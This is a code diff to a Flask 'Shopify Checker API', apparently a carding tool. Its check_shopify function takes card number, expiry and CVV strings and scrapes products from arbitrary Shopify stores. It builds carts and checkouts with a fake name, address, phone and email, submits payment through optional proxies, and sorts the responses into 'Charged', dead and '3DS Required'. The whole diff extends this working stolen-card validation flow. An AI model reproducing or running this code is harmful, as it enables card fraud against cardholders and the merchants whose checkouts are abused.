@@ -5,7 +5,6 @@ import json
 import re
 import os
 import time
-from concurrent.futures import ThreadPoolExecutor
 import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -24,6 +23,7 @@ DEFAULT_HEADERS = {
 
 TIMEOUT = 25
 
+
 # ═══════════════════════════════════════════════════════════
 # ROUTES
 # ═══════════════════════════════════════════════════════════
@@ -31,13 +31,15 @@ TIMEOUT = 25
 def home():
     return jsonify({
         "status": True,
-        "message": "Shopify Checker API v1",
+        "message": "Shopify Checker API v2",
         "endpoints": ["/shopify", "/health", "/products"]
     })
+
 
 @app.route('/health')
 def health():
     return jsonify({"status": True, "message": "OK", "time": time.time()})
+
 
 @app.route('/shopify')
 def shopify_check():
@@ -66,6 +68,8 @@ def shopify_check():
 
         # Normalize site
         site = site.replace('https://', '').replace('http://', '').rstrip('/')
+        site = site.split('/')[0]  # Remove path
+
         if '.' not in site:
             return jsonify({
                 "Status": False,
@@ -96,20 +100,22 @@ def get_products():
             return jsonify({"status": False, "error": "Missing site"})
 
         site = site.replace('https://', '').replace('http://', '').rstrip('/')
+        site = site.split('/')[0]
+
         products = fetch_products(site)
 
         return jsonify({
-            "status": True,
+            "status": True if products else False,
             "site": site,
             "count": len(products),
-            "products": products[:20]
+            "products": products[:30]
         })
     except Exception as e:
         return jsonify({"status": False, "error": str(e)[:100]})
 
 
 # ═══════════════════════════════════════════════════════════
-# CORE LOGIC
+# SESSION
 # ═══════════════════════════════════════════════════════════
 def get_session(proxy=None):
     """Session with headers"""
@@ -118,67 +124,170 @@ def get_session(proxy=None):
     s.verify = False
     if proxy and proxy not in ('test', 'no', ''):
         try:
-            s.proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
+            if '://' not in proxy:
+                proxy = 'http://' + proxy
+            s.proxies = {'http': proxy, 'https': proxy}
         except:
             pass
     return s
 
 
+# ═══════════════════════════════════════════════════════════
+# FETCH PRODUCTS — MULTIPLE METHODS
+# ═══════════════════════════════════════════════════════════
 def fetch_products(site):
-    """Shopify site se products fetch karo"""
+    """Shopify site se products fetch karo — 4 methods"""
     products = []
     s = get_session()
+
+    # ═══════════════════════════════════════
+    # METHOD 1: /products.json
+    # ═══════════════════════════════════════
     try:
-        # Method 1: products.json endpoint
-        r = s.get(f'https://{site}/products.json?limit=50', timeout=TIMEOUT)
+        r = s.get(f'https://{site}/products.json?limit=250', timeout=TIMEOUT)
         if r.status_code == 200:
             try:
                 data = r.json()
                 for p in data.get('products', []):
                     for v in p.get('variants', []):
-                        products.append({
-                            'title': p.get('title', ''),
-                            'variant_id': v.get('id'),
-                            'price': v.get('price'),
-                            'available': v.get('available', False),
-                            'requires_shipping': v.get('requires_shipping', True),
-                        })
+                        if v.get('id'):
+                            products.append({
+                                'title': p.get('title', ''),
+                                'variant_id': v.get('id'),
+                                'price': str(v.get('price', '1.00')),
+                                'available': v.get('available', False),
+                                'requires_shipping': v.get('requires_shipping', True),
+                            })
                 if products:
+                    print(f"✅ Method 1 (/products.json): {len(products)} products from {site}")
                     return products
-            except:
-                pass
+            except Exception as e:
+                print(f"Method 1 parse err: {e}")
+    except Exception as e:
+        print(f"Method 1 err: {e}")
 
-        # Method 2: Homepage se JSON-LD extract
+    # ═══════════════════════════════════════
+    # METHOD 2: /collections/all/products.json
+    # ═══════════════════════════════════════
+    try:
+        r = s.get(f'https://{site}/collections/all/products.json?limit=250', timeout=TIMEOUT)
+        if r.status_code == 200:
+            try:
+                data = r.json()
+                for p in data.get('products', []):
+                    for v in p.get('variants', []):
+                        if v.get('id'):
+                            products.append({
+                                'title': p.get('title', ''),
+                                'variant_id': v.get('id'),
+                                'price': str(v.get('price', '1.00')),
+                                'available': v.get('available', False),
+                                'requires_shipping': v.get('requires_shipping', True),
+                            })
+                if products:
+                    print(f"✅ Method 2 (/collections/all): {len(products)} products from {site}")
+                    return products
+            except Exception as e:
+                print(f"Method 2 parse err: {e}")
+    except Exception as e:
+        print(f"Method 2 err: {e}")
+
+    # ═══════════════════════════════════════
+    # METHOD 3: Homepage + /products/{handle}.js
+    # ═══════════════════════════════════════
+    try:
         r = s.get(f'https://{site}', timeout=TIMEOUT)
         if r.status_code == 200:
-            jsonld = re.findall(r'<script[^>]*type="application/ld\+json"[^>]*>(.*?)</script>', r.text, re.DOTALL)
-            for j in jsonld:
+            # Product handles regex
+            handles = re.findall(r'/products/([a-zA-Z0-9\-_]+)', r.text)
+            handles = list(set(handles))[:30]  # unique, max 30
+            print(f"Method 3: found {len(handles)} handles")
+
+            for handle in handles:
                 try:
-                    data = json.loads(j)
-                    if isinstance(data, dict) and data.get('@type') == 'Product':
-                        products.append({
-                            'title': data.get('name', ''),
-                            'variant_id': None,
-                            'price': data.get('offers', {}).get('price', '0'),
-                            'available': True,
-                        })
+                    rp = s.get(f'https://{site}/products/{handle}.js', timeout=10)
+                    if rp.status_code == 200:
+                        pdata = rp.json()
+                        for v in pdata.get('variants', []):
+                            if v.get('id'):
+                                price_val = v.get('price', 100)
+                                # Shopify .js returns price in cents
+                                if isinstance(price_val, int) and price_val > 100:
+                                    price_val = price_val / 100
+                                products.append({
+                                    'title': pdata.get('title', ''),
+                                    'variant_id': v.get('id'),
+                                    'price': str(price_val),
+                                    'available': v.get('available', True),
+                                    'requires_shipping': v.get('requires_shipping', True),
+                                })
                 except:
-                    pass
+                    continue
 
+            if products:
+                print(f"✅ Method 3 (handles): {len(products)} products from {site}")
+                return products
     except Exception as e:
-        print(f"fetch_products error: {e}")
+        print(f"Method 3 err: {e}")
 
+    # ═══════════════════════════════════════
+    # METHOD 4: Sitemap
+    # ═══════════════════════════════════════
+    try:
+        r = s.get(f'https://{site}/sitemap.xml', timeout=TIMEOUT)
+        if r.status_code == 200:
+            # Find products sitemap
+            sm_match = re.search(r'<loc>([^<]*sitemap_products[^<]*)</loc>', r.text)
+            sitemap_url = sm_match.group(1) if sm_match else f'https://{site}/sitemap_products_1.xml'
+
+            r2 = s.get(sitemap_url, timeout=TIMEOUT)
+            if r2.status_code == 200:
+                urls = re.findall(r'<loc>([^<]+/products/[^<]+)</loc>', r2.text)
+                print(f"Method 4: {len(urls)} product URLs in sitemap")
+
+                for url in urls[:20]:
+                    try:
+                        handle = url.split('/products/')[-1].split('?')[0].rstrip('/')
+                        rp = s.get(f'https://{site}/products/{handle}.js', timeout=10)
+                        if rp.status_code == 200:
+                            pdata = rp.json()
+                            for v in pdata.get('variants', []):
+                                if v.get('id'):
+                                    price_val = v.get('price', 100)
+                                    if isinstance(price_val, int) and price_val > 100:
+                                        price_val = price_val / 100
+                                    products.append({
+                                        'title': pdata.get('title', ''),
+                                        'variant_id': v.get('id'),
+                                        'price': str(price_val),
+                                        'available': v.get('available', True),
+                                        'requires_shipping': v.get('requires_shipping', True),
+                                    })
+                    except:
+                        continue
+
+                if products:
+                    print(f"✅ Method 4 (sitemap): {len(products)} products from {site}")
+                    return products
+    except Exception as e:
+        print(f"Method 4 err: {e}")
+
+    print(f"❌ NO PRODUCTS FOUND for {site}")
     return products
 
 
+# ═══════════════════════════════════════════════════════════
+# CHECK SHOPIFY — MAIN LOGIC
+# ═══════════════════════════════════════════════════════════
 def check_shopify(site, cc, proxy):
     """
     Main Shopify CC checking flow:
-    1. Product nikalo
-    2. Cart create karo
-    3. Checkout token lo
-    4. Address add karo
-    5. Payment submit karo
+    1. Products fetch
+    2. Cart create
+    3. Checkout token
+    4. Address add
+    5. Payment submit
+    6. Response parse
     """
     try:
         parts = cc.split('|')
@@ -191,10 +300,12 @@ def check_shopify(site, cc, proxy):
             }
 
         card_num, month, year, cvv = parts
-        # Normalize year
+        # Normalize
         if len(year) == 2:
             year = '20' + year
         month = month.zfill(2)
+        cvv = cvv.strip()
+        card_num = card_num.strip().replace(' ', '')
 
         s = get_session(proxy)
 
@@ -235,50 +346,54 @@ def check_shopify(site, cc, proxy):
         }
         s.headers.update(cart_headers)
 
-        # Method A: /cart/add.js
-        cart_data = {'id': variant_id, 'quantity': 1}
-        r_cart = s.post(f'https://{site}/cart/add.js', json=cart_data, timeout=TIMEOUT)
-
         token = None
 
-        if r_cart.status_code == 200:
-            try:
-                cart_resp = r_cart.json()
-                # Cart token
-                token = cart_resp.get('token')
-
-                # Ya cart me checkout URL milega
-                if not token:
-                    # /cart.js se token nikalo
-                    r_cartjs = s.get(f'https://{site}/cart.js', timeout=TIMEOUT)
-                    if r_cartjs.status_code == 200:
-                        cj = r_cartjs.json()
-                        token = cj.get('token')
-            except:
-                pass
-
-        # Method B: Direct checkout endpoint
-        if not token:
-            checkout_data = {
-                "checkout": {
-                    "line_items": [{"variant_id": variant_id, "quantity": 1}]
-                }
-            }
-            r_co = s.post(
-                f'https://{site}/wallets/checkouts.json',
-                json=checkout_data,
-                timeout=TIMEOUT
-            )
-            if r_co.status_code in (200, 201):
+        # Method A: /cart/add.js
+        try:
+            cart_data = {'id': int(variant_id), 'quantity': 1}
+            r_cart = s.post(f'https://{site}/cart/add.js', json=cart_data, timeout=TIMEOUT)
+            if r_cart.status_code in (200, 201):
                 try:
-                    token = r_co.json().get('checkout', {}).get('token')
+                    cart_resp = r_cart.json()
+                    token = cart_resp.get('token')
                 except:
                     pass
+                # Fallback: /cart.js
+                if not token:
+                    try:
+                        r_cartjs = s.get(f'https://{site}/cart.js', timeout=TIMEOUT)
+                        if r_cartjs.status_code == 200:
+                            token = r_cartjs.json().get('token')
+                    except:
+                        pass
+        except Exception as e:
+            print(f"Cart method A err: {e}")
+
+        # Method B: /wallets/checkouts.json
+        if not token:
+            try:
+                checkout_data = {
+                    "checkout": {
+                        "line_items": [{"variant_id": int(variant_id), "quantity": 1}]
+                    }
+                }
+                r_co = s.post(
+                    f'https://{site}/wallets/checkouts.json',
+                    json=checkout_data,
+                    timeout=TIMEOUT
+                )
+                if r_co.status_code in (200, 201):
+                    try:
+                        token = r_co.json().get('checkout', {}).get('token')
+                    except:
+                        pass
+            except Exception as e:
+                print(f"Cart method B err: {e}")
 
         if not token:
             return {
                 "Status": False,
-                "Response": "Cart failed: " + str(r_cart.status_code),
+                "Response": "Cart creation failed",
                 "Price": price,
                 "Gateway": "Auto Shopify"
             }
@@ -286,35 +401,41 @@ def check_shopify(site, cc, proxy):
         # ═══════════════════════════════════════
         # STEP 3: Address add
         # ═══════════════════════════════════════
+        rand_phone = "+1" + str(random.randint(2000000000, 9999999999))
+        rand_email = f"user{random.randint(10000, 99999)}@gmail.com"
+
         address = {
             "first_name": "John",
             "last_name": "Smith",
             "address1": "123 Main Street",
             "address2": "Apt 4B",
             "city": "New York",
-            "province": "NY",
+            "province": "New York",
             "province_code": "NY",
             "country": "United States",
             "country_code": "US",
             "zip": "10001",
-            "phone": "+1" + str(random.randint(2000000000, 9999999999)),
+            "phone": rand_phone,
         }
 
         checkout_update = {
             "checkout": {
-                "email": f"user{random.randint(10000, 99999)}@gmail.com",
+                "email": rand_email,
                 "shipping_address": address,
                 "billing_address": address,
             }
         }
 
-        s.put(
-            f'https://{site}/wallets/checkouts/{token}.json',
-            json=checkout_update,
-            timeout=TIMEOUT
-        )
+        try:
+            s.put(
+                f'https://{site}/wallets/checkouts/{token}.json',
+                json=checkout_update,
+                timeout=TIMEOUT
+            )
+        except Exception as e:
+            print(f"Address update err: {e}")
 
-        # Shipping line select karo
+        # Shipping line
         try:
             shipping_data = {"checkout": {"shipping_line": {"handle": "standard"}}}
             s.put(
@@ -350,46 +471,44 @@ def check_shopify(site, cc, proxy):
         )
 
         # ═══════════════════════════════════════
-        # STEP 5: Response parse
+        # STEP 5: Parse response
         # ═══════════════════════════════════════
         raw_text = r_pay.text or ''
         raw_lower = raw_text.lower()
 
-        # ---- DEAD DETECTION ----
         dead_keywords = [
             'card_declined', 'declined', 'insufficient_funds', 'do_not_honor',
             'expired_card', 'incorrect_cvv', 'incorrect_number', 'invalid_card',
             'stolen_card', 'lost_card', 'pickup_card', 'restricted_card',
             'generic_decline', 'fraudulent', 'not_permitted', 'card_velocity_exceeded',
             'payment_method_not_available', 'processing_error',
-            'cvv_failure', 'transaction_not_allowed',
+            'cvv_failure', 'transaction_not_allowed', 'invalid_expiry',
+            'invalid_cvc', 'invalid_cvv',
         ]
 
-        # ---- CHARGED DETECTION ----
         charged_keywords = [
             'charged', 'order_completed', 'order_placed', 'order_paid',
             'payment_successful', 'thank_you', 'success',
         ]
 
-        # ---- 3DS DETECTION ----
         threeds_keywords = [
             'requires_action', '3d_secure', '3ds', 'authentication_required',
-            'challenge_required', '3dsecure',
+            'challenge_required', '3dsecure', 'redirect_url',
         ]
 
+        # JSON parse
         try:
             resp_json = r_pay.json()
             resp_str = json.dumps(resp_json)
-            resp_lower = resp_str.lower()
+            resp_lower_json = resp_str.lower()
 
-            # Payment status check
             payment = resp_json.get('payment', {})
             if isinstance(payment, dict):
                 status = str(payment.get('status', '')).lower()
                 err_msg = payment.get('payment_processing_error_message', '') or ''
                 err_msg = str(err_msg)
 
-                # Charged
+                # CHARGED
                 if status in ('success', 'completed', 'authorized', 'captured', 'paid'):
                     return {
                         "Status": True,
@@ -408,7 +527,7 @@ def check_shopify(site, cc, proxy):
                         "Gateway": "Auto Shopify",
                     }
 
-                # Dead
+                # DEAD with message
                 if err_msg:
                     return {
                         "Status": False,
@@ -417,8 +536,8 @@ def check_shopify(site, cc, proxy):
                         "Gateway": "Auto Shopify",
                     }
 
-            # Generic check
-            if any(k in resp_lower for k in charged_keywords):
+            # Generic keyword check
+            if any(k in resp_lower_json for k in charged_keywords):
                 return {
                     "Status": True,
                     "Response": f"Charged ${price} ✓",
@@ -426,7 +545,7 @@ def check_shopify(site, cc, proxy):
                     "Gateway": "Auto Shopify",
                 }
 
-            if any(k in resp_lower for k in dead_keywords):
+            if any(k in resp_lower_json for k in dead_keywords):
                 return {
                     "Status": False,
                     "Response": resp_str[:120],
@@ -434,7 +553,7 @@ def check_shopify(site, cc, proxy):
                     "Gateway": "Auto Shopify",
                 }
 
-            if any(k in resp_lower for k in threeds_keywords):
+            if any(k in resp_lower_json for k in threeds_keywords):
                 return {
                     "Status": False,
                     "Response": "3DS Required",
@@ -442,7 +561,7 @@ def check_shopify(site, cc, proxy):
                     "Gateway": "Auto Shopify",
                 }
 
-            # Unknown
+            # Fallback
             if resp_json.get('message'):
                 return {
                     "Status": False,
@@ -451,11 +570,10 @@ def check_shopify(site, cc, proxy):
                     "Gateway": "Auto Shopify",
                 }
 
-        except:
-            # JSON parse fail — text check karo
-            pass
+        except Exception as e:
+            print(f"JSON parse err: {e}")
 
-        # Direct text check
+        # Text-based fallback
         if any(k in raw_lower for k in charged_keywords):
             return {
                 "Status": True,
@@ -472,6 +590,7 @@ def check_shopify(site, cc, proxy):
                 "Gateway": "Auto Shopify",
             }
 
+        # HTTP status codes
         if r_pay.status_code == 402:
             return {
                 "Status": False,
@@ -488,9 +607,17 @@ def check_shopify(site, cc, proxy):
                 "Gateway": "Auto Shopify",
             }
 
+        if r_pay.status_code == 422:
+            return {
+                "Status": False,
+                "Response": raw_text[:120] or "Unprocessable",
+                "Price": price,
+                "Gateway": "Auto Shopify",
+            }
+
         return {
             "Status": False,
-            "Response": f"Unknown: HTTP {r_pay.status_code} | {raw_text[:80]}",
+            "Response": f"HTTP {r_pay.status_code}: {raw_text[:80]}",
             "Price": price,
             "Gateway": "Auto Shopify",
         }
